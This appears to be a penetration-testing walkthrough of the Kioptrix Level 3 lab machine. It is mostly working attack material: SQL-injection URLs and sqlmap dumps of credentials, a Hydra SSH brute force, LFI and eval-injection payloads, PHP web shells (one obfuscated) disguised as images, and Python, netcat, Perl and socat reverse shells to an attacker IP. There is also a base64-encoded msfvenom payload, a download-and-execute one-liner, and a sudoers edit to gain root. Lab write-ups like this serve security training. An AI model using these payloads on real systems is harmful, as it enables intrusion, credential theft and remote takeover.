
### Network Configuration
```
--------------------         ------------------
|                  |---------|     Attacker   |
|      Router      |         |  192.168.50.6  |
|                  |         ------------------
|                  |         ------------------
|   192.168.50.1    ---------|     Victim     |
|                  |         |  192.168.50.4  |
--------------------         ------------------
```

Unable to boot : please use a kernel appropriate for your cpu

http://www.linuxliveusb.com/en/help/faq/virtualization/154-unable-to-boot-please-use-a-kernel-appropriate-for-your-cpu

Check `Enable PAE/NX`

---------
```
nmap 192.168.50.* -n -sn -sP

echo "192.168.50.4  kioptrix3.com" >> /etc/hosts

unicornscan -H -msf -Iv kioptrix3.com -p 1-65535

unicornscan -H -mU -Iv kioptrix3.com -p 1-65535

nmap -p 1-65535 -T4 -A -v kioptrix3.com
```
```
dirb http://kioptrix3.com
```

http://kioptrix3.com/gallery/  =>  View Source
```
<!--  <a href="gadmin">Admin</a>&nbsp;&nbsp; -->
```
http://kioptrix3.com/gallery/gadmin
```
searchsploit "Gallarific"
```
https://www.exploit-db.com/exploits/15891/

--------------
```
www.site.com/gallery.php?id=null[Sql Injection]

http://kioptrix3.com/gallery/gallery.php?id=null union select 1,2,3,4,5,6
```
```

(select group_concat(table_name) from information_schema.tables where table_schema=database())

(select group_concat(column_name) from information_schema.columns where table_name='table_xxx')

(select group_concat(column_1, 0x3A, column_2, 0x3A, column_3) from table_xxx)

0x3A  =>  ":"

```
```
http://kioptrix3.com/gallery/gallery.php?id=null union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()),4,5,6
```
> dev_accounts,gallarific_comments,gallarific_galleries,gallarific_photos,gallarific_settings,gallarific_stats,gallarific_users
```
http://kioptrix3.com/gallery/gallery.php?id=null union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='dev_accounts'),4,5,6
```
> id,username,password
```
http://kioptrix3.com/gallery/gallery.php?id=null union select 1,2,(select group_concat(id, 0x3A, username, 0x3A, password) from dev_accounts),4,5,6
```
> 1:dreg:0d3eccfb887aabd50f243b3f155c0f85,2:loneferret:5badcaf789d3d1d09794d8f021f40f0e
```
http://kioptrix3.com/gallery/gallery.php?id=null union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='gallarific_users'),4,5,6
```
> userid,username,password,usertype,firstname,lastname,email,datejoined,website,issuperuser,photo,joincode
```
http://kioptrix3.com/gallery/gallery.php?id=null union select 1,2,(select group_concat(userid, 0x3A, username, 0x3A, password) from gallarific_users),4,5,6
```
>1:admin:n0t7t1k4

```
http://kioptrix3.com/gallery/gadmin/

admin:n0t7t1k4
```
```
echo -e "0d3eccfb887aabd50f243b3f155c0f85\n5badcaf789d3d1d09794d8f021f40f0e" > /tmp/hashes

cat /tmp/hashes

john /tmp/hashes --format=raw-md5
```
OR
```
hash-identifier
0d3eccfb887aabd50f243b3f155c0f85
5badcaf789d3d1d09794d8f021f40f0e

Possible Hashs:
[+]  MD5
```
Go to => https://crackstation.net/
```
0d3eccfb887aabd50f243b3f155c0f85 => Mast3r => dreg
5badcaf789d3d1d09794d8f021f40f0e => starwars => loneferret
```

#### sqlmap

Google Dorks strings to find Vulnerable SQLMAP SQL injectable website

https://gbhackers.com/sqlmap-detecting-exploiting-sql-injection/

List DBMS databases
```
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --dbs

available databases [3]:
[*] gallery
[*] information_schema
[*] mysql

```

List tables of target database
```
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -D gallery --tables

Database: gallery
[7 tables]
+----------------------+
| dev_accounts         |
| gallarific_comments  |
| gallarific_galleries |
| gallarific_photos    |
| gallarific_settings  |
| gallarific_stats     |
| gallarific_users     |
+----------------------+

```

List columns on target table of selected database
```
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -D gallery -T dev_accounts --columns

Database: gallery
Table: dev_accounts
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(10)     |
| password | varchar(50) |
| username | varchar(50) |
+----------+-------------+

```

List information from target columns of target table of selected database
```
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -D gallery -T dev_accounts -C id,username,password --dump

Database: gallery
Table: dev_accounts
[2 entries]
+----+------------+----------------------------------+
| id | username   | password                         |
+----+------------+----------------------------------+
| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |
| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |
+----+------------+----------------------------------+

```
```
msf > search LotusCMS

use exploit/multi/http/lcms_php_exec

set rhost 192.168.50.4
set uri /
exploit
```
```
ssh loneferret@kioptrix3.com

cd /home/www/kioptrix3.com/

find . -name '*.php' | grep config
OR
find /home/www/kioptrix3.com/ -name '*.php' | grep config

cat ./gallery/gconfig.php

	$GLOBALS["gallarific_mysql_username"] = "root";
	$GLOBALS["gallarific_mysql_password"] = "fuckeyou";

```

#### Bruteforcing SSH for loneferret

> danielmiessler/SecLists

https://github.com/danielmiessler/SecLists

https://github.com/danielmiessler/SecLists/tree/master/Passwords

https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials

> 10-million-password-list-top-1000000

https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

> Change 'blob' to 'raw' then use wget to download this 'big' file
```
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

OR

wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
```

#### Using Hydra

IMPORTANT:_ When running hydra, make sure you include -t 4 parameter, otherwise the service could get overloaded and not all passwords will be tested properly.
```
hydra -e nsr -l loneferret -P ~/10-million-password-list-top-1000000.txt -t 4 192.168.50.4 ssh
OR
hydra -e nsr -l loneferret -P ~/10-million-password-list-top-1000000.txt -t 4 ssh://192.168.50.4

[22][ssh] host: 192.168.50.4   login: loneferret   password: starwars
1 of 1 target successfully completed, 1 valid password found

```

#### Privilege Escalation to root
```
kali# ssh loneferret@kioptrix3.com

$ ls -la

$ cat CompanyPolicy.README

$ which ht
/usr/local/bin/ht

$ ls -la /usr/local/bin/ht
-rwsr-sr-x 1 root root 2072344 2011-04-16 07:26 /usr/local/bin/ht
```
> This `ht` file has setuid bit enabled, AND is owned by root.
```
$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
```
=> This means we can edit any file we want even it’s owned by root!
```
$ sudo ht
Error opening terminal: xterm-256color.

$ echo $TERM
xterm-256color

$ export TERM=xterm

$ echo $TERM
xterm

$ sudo ht
```
> Edit the file `/etc/sudoers`
```
loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht, /bin/bash

OR

loneferret ALL=(ALL) ALL
```
```
$ sudo /bin/bash

root@Kioptrix3:~# whoami; id; uname -a
```

#### TESTING PURPOSE ONLY

Try these commands before editing `sudoers`
```
loneferret@Kioptrix3:~$ sudo -u dreg /bin/bash
loneferret@Kioptrix3:~$ whoami; id
```
Edit `sudoers`
```
loneferret ALL=(dreg) ALL
```
Run the above commands again
```
loneferret@Kioptrix3:~$ sudo -u dreg /bin/bash
loneferret@Kioptrix3:~$ whoami; id
```

How To Edit the Sudoers File on Ubuntu and CentOS

https://www.digitalocean.com/community/tutorials/how-to-edit-the-sudoers-file-on-ubuntu-and-centos

Take Control of your Linux | sudoers file: How to with Examples

https://www.garron.me/en/linux/visudo-command-sudoers-file-sudo-default-editor.html

Sudoers

https://help.ubuntu.com/community/Sudoers

---------------------------
```
kali# ssh loneferret@kioptrix3.com

cd /etc/apache2/sites-enabled

ls

cat * | grep -i documentroot    ##  -i, --ignore-case  =>  ignore case distinctions

#	DocumentRoot "/var/www"
        DocumentRoot /home/www/kioptrix3.com
```
```
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -f -b --current-user --is-dba --dbs

[11:33:40] [INFO] executing MySQL comment injection fingerprint
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: active fingerprint: MySQL >= 5.0.38 and < 5.1.2
               comment injection fingerprint: MySQL 5.0.51
               banner parsing fingerprint: MySQL >= 5.0.38 and < 5.1.2
banner:    '5.0.51a-3ubuntu5.4'

[11:33:40] [INFO] fetching current user
current user:    'root@localhost'

[11:33:40] [INFO] testing if current user is DBA
current user is DBA:    True

[11:33:40] [INFO] fetching database names
available databases [3]:
[*] gallery
[*] information_schema
[*] mysql
```
```
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --users --passwords

database management system users password hashes:
[*] debian-sys-maint [1]:
    password hash: NULL
[*] root [2]:
    password hash: *47FB3B1E573D80F44CD198DC65DE7764795F948E
    password hash: *F46D660C8ED1B312A40E366A86D958C6F1EF2AB8

```
```
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --file-read="/etc/passwd"

sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --dump

```

--------------------------

#### LFI vulnerability in LotusCMS
```
http://kioptrix3.com/index.php?system=../../../../../etc/passwd%00.html
```

Place a BACKDOOR

http://kioptrix3.com/gallery/gadmin/

http://kioptrix3.com/gallery/gadmin/photos.php?task=add
```
admin:n0t7t1k4

```

> nano cmd.php
```
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST["cmd"]);
    system($cmd);
    //echo "</pre>$cmd<pre>";
    die;
}
?>
```
```
cp cmd.php cmd.jpg

ls
```
Upload backdoor
```
http://kioptrix3.com/index.php?system=../../../../../home/www/kioptrix3.com/gallery/photos/809y6lxf56.jpg%00.html&cmd=id

http://kioptrix3.com/index.php?system=../../../../../home/www/kioptrix3.com/gallery/photos/809y6lxf56.jpg%00.html&cmd=uname -a
```
OR
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.50.6 LPORT=5555 -f raw > backdoor.jpg

msf> use multi/handler + set payload php/meterpreter/reverse_tcp
```
Upload backdoor
```
http://kioptrix3.com/index.php?system=../../../../../home/www/kioptrix3.com/gallery/photos/u0vi7wea88.jpg%00.html
```
Check multi/handler...

---------------------

> Reverse Shell Cheat Sheet

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://www.gnucitizen.org/blog/reverse-shell-with-bash/

----------------------

> LotusCMS may be vulnerable to a remote code execution exploit in the way it handles the eval() function...
```
http://kioptrix3.com/index.php?page=index'

http://kioptrix3.com/index.php?page=index%27
```

**Raw**
```
');${print('ALEX123')};#

http://kioptrix3.com/index.php?page=index');${print('ALEX123')};#

http://kioptrix3.com/index.php?page=index')%3b%24{print('ALEX123')}%3b%23
```
**URL Encoded**
```
%27%29%3b%24%7b%70%72%69%6e%74%28%27%41%4c%45%58%31%32%33%27%29%7d%3b%23

http://kioptrix3.com/index.php?page=index%27%29%3b%24%7b%70%72%69%6e%74%28%27%41%4c%45%58%31%32%33%27%29%7d%3b%23
```

#### Python Reverse Shell

**Raw**
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.50.6",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

');${system('payload')};#

');${system('python -c \'command1;command2;command3;\'')};#

');${system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.50.6",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')};#
```
**URL Encoded**
```
%27%29%3b%24%7b%73%79%73%74%65%6d%28%27%70%79%74%68%6f%6e%20%2d%63%20%5c%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%35%30%2e%36%22%2c%37%37%37%37%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29%3b%5c%27%27%29%7d%3b%23
````
```
nc -lnvp 7777
```
```
http://kioptrix3.com/index.php?page=index%27

http://kioptrix3.com/index.php?page=index%27%29%3b%24%7b%73%79%73%74%65%6d%28%27%70%79%74%68%6f%6e%20%2d%63%20%5c%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%35%30%2e%36%22%2c%37%37%37%37%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29%3b%5c%27%27%29%7d%3b%23
```

#### Netcat Reverse Shell
```
');${system('nc -e /bin/sh 192.168.50.6 7777')};#

%27%29%3b%24%7b%73%79%73%74%65%6d%28%27%6e%63%20%2d%65%20%2f%62%69%6e%2f%73%68%20%31%39%32%2e%31%36%38%2e%35%30%2e%36%20%37%37%37%37%27%29%7d%3b%23
```
```
nc -lnvp 7777
```
```
http://kioptrix3.com/index.php?page=index%27%29%3b%24%7b%73%79%73%74%65%6d%28%27%6e%63%20%2d%65%20%2f%62%69%6e%2f%73%68%20%31%39%32%2e%31%36%38%2e%35%30%2e%36%20%37%37%37%37%27%29%7d%3b%23
```
------------------------

Try to find any passwords in readable files
```
cd /home/www/kioptrix3.com/

grep --exclude=*.js -rn "password" .
OR
grep --exclude=*.js -rn "password" /home/www/kioptrix3.com/

./gallery/gconfig.php:20:	$GLOBALS["gallarific_mysql_password"] = "fuckeyou";

cat ./gallery/gconfig.php

	$GLOBALS["gallarific_mysql_username"] = "root";
	$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
```

Grep the folder for `localhost` => attempt to find the file that is making the connection to MySQL
```
cd /home/www/kioptrix3.com/

grep "localhost" ./ -R
OR
grep "localhost" /home/www/kioptrix3.com/ -R

./gallery/gconfig.php:	$GLOBALS["gallarific_mysql_server"] = "localhost";

cat ./gallery/gconfig.php

	$GLOBALS["gallarific_mysql_username"] = "root";
	$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
```
---------------

#### PHP-backdoors

obfuscated-phpshell.php

https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/PHP/obfuscated-phpshell.php
```
nano obfuscated-phpshell.php
```
```
<?php

$pass = "534b44a19bf18d20b71ecc4eb77c572f";  //alex

$A = chr(0x73);
$B = chr(0x79);
$X = chr(0x74);
$D = chr(0x65);
$E = chr(0x6d);

$hook = $A.$B.$A.$X.$D.$E;  // Decode as ASCII hex => system

if($pass == md5($_REQUEST['password']))
{
  $hook($_REQUEST['cmd']);
}
else
{
  die();
}
?>
```
```
cp obfuscated-phpshell.php obfuscated.jpg
```
Upload backdoor

Access to php-backdoor using password=alex
```
http://kioptrix3.com/index.php?system=../../../../../home/www/kioptrix3.com/gallery/photos/x1ij2d05n0.jpg%00.html&password=alex&cmd=id
```
```
http://kioptrix3.com/gallery/gadmin/
http://kioptrix3.com/gallery/gadmin/photos.php?task=add
```
> admin:n0t7t1k4
```
https://github.com/tennc/webshell/blob/master/php/PHPshell/c99/c99.php
https://github.com/tennc/webshell/blob/master/php/PHPshell/r57shell/r57shell.php
```
```
cp ~/Downloads/c99.php ~/c99.jpg
cp ~/Downloads/r57shell.php ~/r57.jpg
```
```
http://kioptrix3.com/index.php?system=../../../../../home/www/kioptrix3.com/gallery/photos/iu510h61yf.jpg%00.html
```
----------------------

Metasploit has several payloads under "cmd/unix" that can be used to generate one-liner bind or reverse shells
```
msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
```

For netcat (not requiring the -e flag)
```
msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.50.6 LPORT=5555 -f raw

mkfifo /tmp/vxyhqq; nc 192.168.50.6 5555 0</tmp/vxyhqq | /bin/sh >/tmp/vxyhqq 2>&1; rm /tmp/vxyhqq
```

For Python
```
msfvenom -p cmd/unix/reverse_python LHOST=192.168.50.6 LPORT=5555 -f raw

python -c "exec('aW1wb3J0IHNvY2tldCAgICAgICAgICwgICAgIHN1YnByb2Nlc3MgICAgICAgICAsICAgICBvcyAgOyAgICAgICAgIGhvc3Q9IjE5Mi4xNjguNTAuNiIgIDsgICAgICAgICBwb3J0PTU1NTUgIDsgICAgICAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgICAgICAgICAsICAgICBzb2NrZXQuU09DS19TVFJFQU0pICA7ICAgICAgICAgcy5jb25uZWN0KChob3N0ICAgICAgICAgLCAgICAgcG9ydCkpICA7ICAgICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAgLCAgICAgMCkgIDsgICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICAsICAgICAxKSAgOyAgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgICwgICAgIDIpICA7ICAgICAgICAgcD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp'.decode('base64'))"
```

For Perl
```
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.50.6 LPORT=5555 -f raw

perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.50.6:5555");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
```

#### Upgrading simple shells to fully interactive TTYs

https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

**Method 1: Python pty module**

To upgrade a dumb shell, simply run the following command:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

**Method 2: Using socat**

On Kali (listen):
```
socat file:`tty`,raw,echo=0 tcp-listen:5678
```
On Victim (launch):
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.50.6:5678
```
If socat isn't installed, you're not out of luck. There are standalone binaries that can be downloaded from this awesome Github repo:

```
https://github.com/andrew-d/static-binaries

https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
```

Link download socat:

https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat

With a command injection vuln, it's possible to download the correct architecture socat binary to a writable directoy, chmod it, then execute a reverse shell in one line:
```
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.50.6:5678
```
For testing purpose, we use Apache web server on Kali:

On Kali (listen):
```
socat file:`tty`,raw,echo=0 tcp-listen:5678
```
On Victim (launch):
```
wget http://192.168.50.6/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.50.6:5678
```

**Method 3: Upgrading from netcat with magic**

First, follow the same technique as in Method 1 and use Python to spawn a PTY. Once bash is running in the PTY, background the shell with Ctrl-Z

> In reverse shell
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
=> Ctrl-Z
```
While the shell is in the background, now examine the current terminal and STTY info so we can force the connected shell to match it
```
$ echo $TERM
$ stty -a
```
The information needed is the TERM type ("xterm-256color") and the size of the current TTY ("rows xxx; columns yyy")

> In Kali
```
$ stty raw -echo
$ fg
```
With a raw stty, input/output will look weird and you won't see the next commands, but as you type they are being processed

> In reverse shell
```
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <xxx> columns <yyy>
```
NOTE: After the reset command, if asked the terminal type, type `xterm`

